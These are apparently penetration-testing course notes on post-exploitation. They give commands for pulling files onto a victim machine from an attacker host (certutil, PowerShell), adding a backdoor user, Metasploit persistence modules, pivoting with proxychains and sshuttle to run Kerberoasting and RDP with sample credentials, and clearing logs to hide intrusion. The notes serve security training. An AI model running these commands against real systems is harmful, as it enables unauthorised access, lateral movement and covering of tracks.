# Introduction
- File Transfers Review
- Maintaining Access Overview
- Pivoting Overview
- Pivoting Walkthrough
- Cleaning Up

# File Transfers Review
- Certutil
```batch
certutil.exe -urlcache -f http:/10.10.10.10/file.txt file.txt
```
- Powershell
```powershell
Invoke-WebRequest -Uri "http://10.10.10.10:8000/filename.txt" -OutFile "filename.txt"
```
- HTTP with Python
```bash
python3 -m http.server 80
```
- Browser
   - Navigate to the file directly
- FTP
Attacker machine
```bash
python3 -m pyftpdlib 21
```
Victim machine
```batch
ftp 10.10.10.10
```
- Linux
   - `wget`
- Metasploit: The meterpreter shell has an upload and download functionality
# Maintaining Access Overview
- For pentests and not red teaming.
```batch
net user username password /add
```
- Metasploit: Risky as it leaves unauthenticated open ports that could be used by anyone.
```bash
run persistence -h
exploit/windows/local/persistence
exploit/windows/local/registry_persistence
```
- Secheduled tasks
```bash
run scheduleme
run schtaskabuse
```
# Pivoting Overview
Machine with two NICs and access to more than one network.
Set up a proxy and pivot through that.
- Proxychains
Look at the configuration file. Note the port that is being used for `socks4`
```bash
cat /etc/proxychains4.conf
```
Set SSH connection using that proxychains port
```bash
ssh -f -N -D 9050 -i ~/.ssh/key-to-use user@ip
```
Run nmap through proxychains
```bash
sudo proxychains nmap -p port-numbers ip-address
# Sometimes the -sT might be helpful
sudo proxychains nmap ip-address -sT
```
Run other attacks through proxychains
```bash
sudo proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.0.0.3 -request
```
Run RDP through proxychains
```bash
sudo proxychains xfreerdp /u:administrator /p:'Delicious123!' /v:10.10.10.5
```
- Sshuttle
Tab 1: Run the command below to establish the connection and leave it open
```bash
sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"
```
Tab2: Now run any command you want and it should be proxied through
```bash
nmap -p port-numbers ip-address
```
- Chisel tool mention
   - [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
# Cleaning Up
## Pentest perspective
Leave the network the same as when you entered it
Remove executables, scripts, and added files.
Reset configurations, remove added user, etc.
## Red Team perspective
Same as the pentest perspective.
Make it look like you were never there.
Clear log files.
